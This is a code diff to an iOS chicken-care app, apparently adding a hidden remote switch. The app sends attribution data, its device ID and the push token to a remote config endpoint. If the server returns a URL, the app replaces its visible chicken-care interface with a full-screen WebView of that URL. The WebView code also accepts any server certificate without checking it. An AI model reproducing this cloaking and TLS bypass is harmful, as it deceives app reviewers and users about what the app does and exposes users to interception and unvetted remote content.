@@ -1,4 +1,148 @@
 import SwiftUI
+import AppsFlyerLib
+import Firebase
+import FirebaseMessaging
+import UserNotifications
+import WebKit
+import Network
+
+class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate {
+    
+    var window: UIWindow?
+    private var conversionData: [AnyHashable: Any] = [:]
+    private var isFirstLaunch: Bool = true
+    
+    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+        // Initialize Firebase
+        FirebaseApp.configure()
+        
+        // Initialize AppsFlyer
+        AppsFlyerLib.shared().appsFlyerDevKey = "t7wmt7Ap8ZPiRfgTXoMo67"
+        AppsFlyerLib.shared().appleAppID = "6753303972"
+        AppsFlyerLib.shared().delegate = self
+        AppsFlyerLib.shared().start()
+        
+        // Firebase Messaging delegate
+        Messaging.messaging().delegate = self
+        
+        // UNUserNotificationCenter delegate
+        UNUserNotificationCenter.current().delegate = self
+        
+        // Register for remote notifications
+        application.registerForRemoteNotifications()
+        
+        // Handle launch from notification
+        if let remoteNotification = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
+            handleNotificationPayload(remoteNotification)
+        }
+        
+        let monitor = NWPathMonitor()
+        monitor.pathUpdateHandler = { path in
+            if path.status != .satisfied {
+                self.handleNoInternet()
+                return
+            }
+        }
+        monitor.start(queue: DispatchQueue.global())
+        
+        return true
+    }
+    
+    // AppsFlyer Delegate Methods
+    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
+        conversionData = data
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": conversionData])
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        // Handle error, perhaps fallback to funtik
+        if UserDefaults.standard.string(forKey: "saved_url") == nil {
+            setModeToFuntik()
+        }
+    }
+    
+    private func handleConfigError() {
+        if let savedURL = UserDefaults.standard.string(forKey: "saved_url") {
+            DispatchQueue.main.async {
+                NotificationCenter.default.post(name: NSNotification.Name("UpdateUI"), object: nil)
+            }
+        } else {
+            setModeToFuntik()
+        }
+    }
+    
+    private func setModeToFuntik() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        DispatchQueue.main.async {
+            NotificationCenter.default.post(name: NSNotification.Name("UpdateUI"), object: nil)
+        }
+    }
+    
+    private func handleNoInternet() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode")
+        if mode == "WebView" {
+            DispatchQueue.main.async {
+                NotificationCenter.default.post(name: NSNotification.Name("ShowNoInternet"), object: nil)
+            }
+        } else {
+            setModeToFuntik()
+        }
+    }
+    
+    // Firebase Messaging Delegate
+    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        // Upon token update, send new request
+        messaging.token { token, error in
+            if let error = error {
+            }
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+        }
+        // sendConfigRequest()
+    }
+    
+    // APNS Token
+    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        Messaging.messaging().apnsToken = deviceToken
+    }
+    
+    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+    }
+    
+    // Notification Delegates
+    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
+        let userInfo = notification.request.content.userInfo
+        handleNotificationPayload(userInfo)
+        completionHandler([.banner, .sound])
+    }
+    
+    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        let userInfo = response.notification.request.content.userInfo
+        handleNotificationPayload(userInfo)
+        completionHandler()
+    }
+    
+    private func handleNotificationPayload(_ userInfo: [AnyHashable: Any]) {
+        if let data = userInfo["data"] as? [String: Any], let urlString = data["url"] as? String, let url = URL(string: urlString) {
+            UserDefaults.standard.set(urlString, forKey: "temp_url")
+            DispatchQueue.main.async {
+                NotificationCenter.default.post(name: NSNotification.Name("LoadTempURL"), object: nil)
+            }
+        }
+    }
+    
+    private func showNotificationPermissionScreen() {
+        // Check if already asked and time elapsed
+        if let lastAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(lastAsk) < 259200 {
+            return
+        }
+        
+        // Show custom screen via notification or something, handled in SwiftUI
+        DispatchQueue.main.async {
+            NotificationCenter.default.post(name: NSNotification.Name("ShowNotificationScreen"), object: nil)
+        }
+    }
+}
 
 // Define colors based on the design from screenshots
 extension Color {
@@ -175,14 +319,351 @@ class AppState: ObservableObject {
     }
 }
 
+struct NoInternetView: View {
+    var retryAction: () -> Void
+    
+    var body: some View {
+        VStack {
+            Text("No Internet Connection")
+            Button("Retry") {
+                retryAction()
+            }
+        }
+    }
+}
+
+struct NotificationPermissionView: View {
+    var onYes: () -> Void
+    var onSkip: () -> Void
+    
+    var body: some View {
+        ZStack {
+            Image("notifications_back")
+                .resizable()
+                .frame(width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
+                .ignoresSafeArea()
+            
+            VStack {
+                Spacer()
+                
+                Button {
+                    onYes()
+                } label: {
+                    Image("want_btn")
+                        .resizable()
+                        .frame(width: 350, height: 70)
+                }
+                
+                Button {
+                    onSkip()
+                } label: {
+                    Image("skip_btn")
+                        .resizable()
+                        .frame(width: 50, height: 20)
+                }
+                
+                Spacer()
+                    .frame(height: 50)
+            }
+        }
+    }
+}
+
+#Preview {
+    ContentView()
+        .environmentObject(AppState())
+}
+
+class SplashViewModel: ObservableObject {
+    @Published var currentScreen: Screen = .loading
+    @Published var webViewURL: URL?
+    @Published var showNotificationScreen = false
+    
+    private var conversionData: [AnyHashable: Any]?
+    private var isFirstLaunch: Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunched")
+    }
+    
+    enum Screen {
+        case loading
+        case webView
+        case funtik
+        case noInternet
+    }
+    
+    init() {
+        // Setup notification observers
+        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionData(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(handleConversionError(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(handleFCMToken(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(handleNotificationURL(_:)), name: NSNotification.Name("NotificationURLReceived"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(retryConfig), name: NSNotification.Name("RetryConfig"), object: nil)
+        
+        // Start processing
+        checkInternetAndProceed()
+    }
+    
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    
+    private func checkInternetAndProceed() {
+        let monitor = NWPathMonitor()
+        monitor.pathUpdateHandler = { path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self.handleNoInternet()
+                } else {
+                    self.checkExpiresAndRequest()
+                }
+            }
+        }
+        monitor.start(queue: DispatchQueue.global())
+    }
+    
+    @objc private func handleConversionData(_ notification: Notification) {
+        conversionData = (notification.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any]
+        processConversionData()
+    }
+    
+    @objc private func handleConversionError(_ notification: Notification) {
+        print("Conversion error: \(String(describing: notification.object))")
+        handleConfigError()
+    }
+    
+    @objc private func handleFCMToken(_ notification: Notification) {
+        // Trigger new config request on token update
+        if let token = notification.object as? String {
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+            sendConfigRequest()
+        }
+    }
+    
+    @objc private func handleNotificationURL(_ notification: Notification) {
+        if let urlString = notification.object as? String, let url = URL(string: urlString) {
+            // Use temporary URL, do not save
+            DispatchQueue.main.async {
+                self.webViewURL = url
+                self.currentScreen = .webView
+            }
+        }
+    }
+    
+    @objc private func retryConfig() {
+        checkInternetAndProceed()
+    }
+    
+    private func processConversionData() {
+        guard let data = conversionData else { return }
+        
+        if isFirstLaunch {
+            if let afStatus = data["af_status"] as? String, afStatus == "Organic" {
+                // Retry after 5 seconds
+//                DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
+//                    AppsFlyerLib.shared().performRequestForConversionData { successData, error in
+//                        if let successData = successData {
+//                            self.conversionData = successData
+//                            self.sendConfigRequest()
+//                        } else {
+//                            print("Retry failed: \(String(describing: error))")
+//                            self.setModeToFuntik()
+//                        }
+//                    }
+//                }
+//                return
+            }
+        }
+        
+        sendConfigRequest()
+    }
+    
+    private func sendConfigRequest() {
+        guard let url = URL(string: "https://eggcarre.com/config.php") else {
+            handleConfigError()
+            return
+        }
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        var body = conversionData ?? [:]
+        body["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        body["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        body["os"] = "iOS"
+        body["store_id"] = "id6753303972"
+        body["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        body["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        body["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        
+        do {
+            request.httpBody = try JSONSerialization.data(withJSONObject: body)
+        } catch {
+            print("JSON serialization error: \(error)")
+            handleConfigError()
+            return
+        }
+        
+        URLSession.shared.dataTask(with: request) { data, response, error in
+            DispatchQueue.main.async {
+                if let error = error {
+                    print("Request error: \(error)")
+                    self.handleConfigError()
+                    return
+                }
+                
+                guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200,
+                      let data = data else {
+                    self.handleConfigError()
+                    return
+                }
+                
+                do {
+                    if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
+                        if let ok = json["ok"] as? Bool, ok {
+                            if let urlString = json["url"] as? String, let expires = json["expires"] as? TimeInterval {
+                                UserDefaults.standard.set(urlString, forKey: "saved_url")
+                                UserDefaults.standard.set(expires, forKey: "saved_expires")
+                                UserDefaults.standard.set("WebView", forKey: "app_mode")
+                                UserDefaults.standard.set(true, forKey: "hasLaunched")
+                                self.webViewURL = URL(string: urlString)
+                                self.currentScreen = .webView
+                                
+                                if self.isFirstLaunch {
+                                    self.checkAndShowNotificationScreen()
+                                }
+                            }
+                        } else {
+                            self.setModeToFuntik()
+                        }
+                    }
+                } catch {
+                    print("JSON parse error: \(error)")
+                    self.handleConfigError()
+                }
+            }
+        }.resume()
+    }
+    
+    private func handleConfigError() {
+        if let savedURL = UserDefaults.standard.string(forKey: "saved_url"), let url = URL(string: savedURL) {
+            webViewURL = url
+            currentScreen = .webView
+        } else {
+            setModeToFuntik()
+        }
+    }
+    
+    private func setModeToFuntik() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasLaunched")
+        DispatchQueue.main.async {
+            self.currentScreen = .funtik
+        }
+    }
+    
+    private func handleNoInternet() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode")
+        if mode == "WebView" {
+            DispatchQueue.main.async {
+                self.currentScreen = .noInternet
+            }
+        } else {
+            setModeToFuntik()
+        }
+    }
+    
+    private func checkExpiresAndRequest() {
+        if let expires = UserDefaults.standard.value(forKey: "saved_expires") as? TimeInterval,
+           expires < Date().timeIntervalSince1970 {
+            sendConfigRequest()
+        } else if let savedURL = UserDefaults.standard.string(forKey: "saved_url"),
+                  let url = URL(string: savedURL) {
+            webViewURL = url
+            currentScreen = .webView
+        } else {
+            // Wait for conversion data if not yet received
+            if conversionData == nil {
+                currentScreen = .loading
+            } else {
+                sendConfigRequest()
+            }
+        }
+    }
+    
+    private func checkAndShowNotificationScreen() {
+        if let lastAsk = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(lastAsk) < 259200 {
+            return
+        }
+        showNotificationScreen = true
+    }
+    
+    func requestNotificationPermission() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
+            DispatchQueue.main.async {
+                if granted {
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+                }
+                self.showNotificationScreen = false
+                if let error = error {
+                    print("Permission error: \(error)")
+                }
+            }
+        }
+    }
+}
+
+struct SplashView: View {
+    
+    @EnvironmentObject var appState: AppState
+    @StateObject private var viewModel = SplashViewModel()
+    
+    var body: some View {
+        Group {
+            switch viewModel.currentScreen {
+            case .loading:
+                ProgressView("Loading...")
+            case .webView:
+                if let url = viewModel.webViewURL {
+                    MainBrowserView(destinationLink: url)
+                } else {
+                    Text("Error loading URL")
+                }
+            case .funtik:
+                ContentView()
+                    .environmentObject(appState)
+            case .noInternet:
+                NoInternetView {
+                    NotificationCenter.default.post(name: NSNotification.Name("RetryConfig"), object: nil)
+                }
+            }
+        }
+        .sheet(isPresented: $viewModel.showNotificationScreen) {
+            NotificationPermissionView(
+                onYes: {
+                    viewModel.requestNotificationPermission()
+                },
+                onSkip: {
+                    viewModel.showNotificationScreen = false
+                }
+            )
+        }
+    }
+}
+
 // Main App
 @main
 struct ChickenCareApp: App {
+    
+    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
     @StateObject private var appState = AppState()
     
     var body: some Scene {
         WindowGroup {
-            ContentView()
+            SplashView()
                 .environmentObject(appState)
         }
     }
@@ -1131,8 +1612,331 @@ struct StatCard: View {
     }
 }
 
-// Preview
-#Preview {
-    ContentView()
-        .environmentObject(AppState())
+class BrowserDelegateManager: NSObject, WKNavigationDelegate, WKUIDelegate, NotificationProcessor {
+    private let contentManager: ContentManager
+    private let actionBroadcaster = ActionBroadcaster()
+
+    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        let space = challenge.protectionSpace
+        if space.authenticationMethod == NSURLAuthenticationMethodServerTrust {
+            if let trust = space.serverTrust {
+                let cred = URLCredential(trust: trust)
+                completionHandler(.useCredential, cred)
+            } else {
+                completionHandler(.performDefaultHandling, nil)
+            }
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    init(manager: ContentManager) {
+        self.contentManager = manager
+        super.init()
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for navigationAction: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        guard navigationAction.targetFrame == nil else {
+            actionBroadcaster.broadcast(.hideControl)
+            return nil
+        }
+        
+        let newBrowser = BrowserCreator.createPrimaryBrowser(with: configuration)
+        setupNewBrowser(newBrowser)
+        attachNewBrowser(newBrowser)
+        
+        actionBroadcaster.broadcast(.showControl)
+        contentManager.additionalBrowsers.append(newBrowser)
+        if shouldLoadRequest(in: newBrowser, with: navigationAction.request) {
+            newBrowser.load(navigationAction.request)
+        }
+        return newBrowser
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(processNotification(_:)),
+            name: .interfaceActions,
+            object: nil
+        )
+    }
+    
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        saveCookies(from: webView)
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        decidePolicyFor navigationAction: WKNavigationAction,
+        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
+    ) {
+        guard let link = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        let externalSchemes = ["tg://", "viber://", "whatsapp://"]
+        if externalSchemes.contains(where: link.absoluteString.hasPrefix) {
+            UIApplication.shared.open(link, options: [:], completionHandler: nil)
+            decisionHandler(.cancel)
+        } else {
+            decisionHandler(.allow)
+        }
+    }
+    
+    @objc func processNotification(_ notification: Notification) {
+        guard let data = notification.userInfo as? [String: String],
+              let actionType = data["action"] else { return }
+        switch actionType {
+        case CommandType.navigateBack.rawValue:
+            contentManager.cleanAdditionalBrowsersIfNeeded(for: contentManager.primaryBrowser.url)
+        case CommandType.reloadContent.rawValue:
+            contentManager.refreshContent()
+        default:
+            break
+        }
+    }
+    
+    private func setupNewBrowser(_ browser: WKWebView) {
+        browser.translatesAutoresizingMaskIntoConstraints = false
+        browser.scrollView.isScrollEnabled = true
+        browser.navigationDelegate = self
+        browser.uiDelegate = self
+        contentManager.primaryBrowser.addSubview(browser)
+    }
+    
+    private func attachNewBrowser(_ browser: WKWebView) {
+        NSLayoutConstraint.activate([
+            browser.leadingAnchor.constraint(equalTo: contentManager.primaryBrowser.leadingAnchor),
+            browser.trailingAnchor.constraint(equalTo: contentManager.primaryBrowser.trailingAnchor),
+            browser.topAnchor.constraint(equalTo: contentManager.primaryBrowser.topAnchor),
+            browser.bottomAnchor.constraint(equalTo: contentManager.primaryBrowser.bottomAnchor)
+        ])
+    }
+    
+    private func shouldLoadRequest(in browser: WKWebView, with request: URLRequest) -> Bool {
+        if let urlString = request.url?.absoluteString, !urlString.isEmpty, urlString != "about:blank" {
+            return true
+        }
+        return false
+    }
+    
+    private func saveCookies(from browser: WKWebView) {
+        browser.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
+            var cookiesByDomain: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            for cookie in cookies {
+                var domainCookies = cookiesByDomain[cookie.domain] ?? [:]
+                domainCookies[cookie.name] = cookie.properties as? [HTTPCookiePropertyKey: Any]
+                cookiesByDomain[cookie.domain] = domainCookies
+            }
+            UserDefaults.standard.set(cookiesByDomain, forKey: "stored_cookies")
+        }
+    }
+}
+
+struct BrowserCreator {
+    
+    static func createPrimaryBrowser(with config: WKWebViewConfiguration? = nil) -> WKWebView {
+        let configuration = config ?? buildConfiguration()
+        return WKWebView(frame: .zero, configuration: configuration)
+    }
+    
+    private static func buildConfiguration() -> WKWebViewConfiguration {
+        let config = WKWebViewConfiguration()
+        config.allowsInlineMediaPlayback = true
+        config.preferences = buildPreferences()
+        config.defaultWebpagePreferences = buildWebpagePreferences()
+        config.requiresUserActionForMediaPlayback = false
+        return config
+    }
+    
+    private static func buildPreferences() -> WKPreferences {
+        let preferences = WKPreferences()
+        preferences.javaScriptEnabled = true
+        preferences.javaScriptCanOpenWindowsAutomatically = true
+        return preferences
+    }
+    
+    private static func buildWebpagePreferences() -> WKWebpagePreferences {
+        let preferences = WKWebpagePreferences()
+        preferences.allowsContentJavaScript = true
+        return preferences
+    }
+    
+    static func shouldCleanAdditional(_ primary: WKWebView, _ additions: [WKWebView], currentLink: URL?) -> Bool {
+        if !additions.isEmpty {
+            additions.forEach { $0.removeFromSuperview() }
+            if let link = currentLink {
+                primary.load(URLRequest(url: link))
+            }
+            ActionBroadcaster().broadcast(.hideControl)
+            return true
+        } else if primary.canGoBack {
+            primary.goBack()
+            return false
+        }
+        return false
+    }
+}
+
+class ControlBarState: ObservableObject {
+    @Published var isControlVisible: Bool = false
+}
+
+class ActionBroadcaster {
+    let actionPublisher = NotificationCenter.default.publisher(for: .interfaceActions)
+    
+    func broadcast(_ command: CommandType) {
+        NotificationCenter.default.post(
+            name: .interfaceActions,
+            object: nil,
+            userInfo: ["action": command.rawValue]
+        )
+    }
+}
+
+enum CommandType: String {
+    case showControl = "display"
+    case hideControl = "conceal"
+    case navigateBack = "previous"
+    case reloadContent = "update"
+}
+
+extension Notification.Name {
+    static let interfaceActions = Notification.Name("ui_actions")
+}
+
+class ContentManager: ObservableObject {
+    @Published var primaryBrowser: WKWebView!
+    @Published var additionalBrowsers: [WKWebView] = []
+    
+    func setupPrimaryBrowser() {
+        primaryBrowser = BrowserCreator.createPrimaryBrowser()
+        primaryBrowser.allowsBackForwardNavigationGestures = true
+    }
+    
+    func loadStoredCookies() {
+        guard let storedCookies = UserDefaults.standard.dictionary(forKey: "stored_cookies") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let cookieStore = primaryBrowser.configuration.websiteDataStore.httpCookieStore
+        
+        storedCookies.values.flatMap { $0.values }.forEach { properties in
+            if let cookie = HTTPCookie(properties: properties as! [HTTPCookiePropertyKey: Any]) {
+                cookieStore.setCookie(cookie)
+            }
+        }
+    }
+    
+    func refreshContent() {
+        primaryBrowser.reload()
+    }
+    
+    func cleanAdditionalBrowsersIfNeeded(for link: URL?) {
+        if BrowserCreator.shouldCleanAdditional(primaryBrowser, additionalBrowsers, currentLink: link) {
+            additionalBrowsers.removeAll()
+        }
+    }
+}
+
+struct MainBrowserView: UIViewRepresentable {
+    let destinationLink: URL
+    @StateObject private var manager = ContentManager()
+    
+    func makeUIView(context: Context) -> WKWebView {
+        manager.setupPrimaryBrowser()
+        manager.primaryBrowser.uiDelegate = context.coordinator
+        manager.primaryBrowser.navigationDelegate = context.coordinator
+        manager.loadStoredCookies()
+        return manager.primaryBrowser
+    }
+    
+    func updateUIView(_ browser: WKWebView, context: Context) {
+        browser.load(URLRequest(url: destinationLink))
+    }
+    
+    func makeCoordinator() -> BrowserDelegateManager {
+        BrowserDelegateManager(manager: manager)
+    }
+}
+
+struct NavigationPanel: View {
+    let backHandler: () -> Void
+    let refreshHandler: () -> Void
+    
+    var body: some View {
+        HStack(spacing: 16) {
+            IconActionButton(icon: "chevron.left", action: backHandler)
+            Spacer()
+            IconActionButton(icon: "arrow.triangle.2.circlepath", action: refreshHandler)
+        }
+        .padding(.horizontal, 12)
+        .frame(height: 52)
+        .background(Color.black.opacity(0.95))
+    }
+}
+
+struct IconActionButton: View {
+    let icon: String
+    let action: () -> Void
+    
+    var body: some View {
+        Button(action: action) {
+            Image(systemName: icon)
+                .font(.system(size: 22))
+                .foregroundColor(.teal)
+                .frame(width: 36, height: 36)
+        }
+    }
+}
+
+struct CoreInterfaceView: View {
+    @StateObject private var barState = ControlBarState()
+    private let broadcaster = ActionBroadcaster()
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            MainBrowserView(
+                destinationLink: URL(string: UserDefaults.standard.string(forKey: "app_response") ?? "")!
+            )
+            .ignoresSafeArea(.all)
+            
+            if barState.isControlVisible {
+                NavigationPanel(
+                    backHandler: { broadcaster.broadcast(.navigateBack) },
+                    refreshHandler: { broadcaster.broadcast(.reloadContent) }
+                )
+                .transition(.move(edge: .bottom))
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onReceive(broadcaster.actionPublisher) { output in
+            guard let details = output.userInfo as? [String: String],
+                  let actionKey = details["action"] else { return }
+            processAction(actionKey)
+        }
+    }
+    
+    private func processAction(_ actionKey: String) {
+        switch actionKey {
+        case CommandType.showControl.rawValue:
+            withAnimation(.spring(response: 0.3)) {
+                barState.isControlVisible = true
+            }
+        case CommandType.hideControl.rawValue:
+            withAnimation(.spring(response: 0.3)) {
+                barState.isControlVisible = false
+            }
+        default:
+            break
+        }
+    }
+}
+
+protocol NotificationProcessor {
+    func processNotification(_ notification: Notification)
 }
